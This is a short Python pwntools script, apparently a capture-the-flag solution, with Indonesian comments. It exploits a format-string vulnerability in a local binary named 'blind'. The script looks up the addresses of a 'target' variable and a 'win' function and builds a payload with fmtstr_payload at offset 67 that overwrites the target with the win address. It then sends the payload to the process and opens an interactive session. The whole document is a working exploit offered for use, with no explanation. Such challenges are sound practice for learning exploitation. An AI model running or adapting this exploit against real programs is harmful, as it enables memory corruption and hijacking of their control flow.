#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./blind')
target_addr = elf.symbols['target']
win_addr    = elf.symbols['win']

log.info(f"Alamat variabel target : {hex(target_addr)}")
log.info(f"Alamat fungsi win      : {hex(win_addr)}")

# Offset ke parameter yang bisa kita kontrol (sesuaikan dengan analisis binary)
offset = 67

writes = { target_addr: win_addr }

payload = fmtstr_payload(offset, writes)
log.info(f"Payload: {payload}")

p = process('./blind')
p.recvuntil("Masukkan input: ")
p.sendline(payload)

p.interactive()
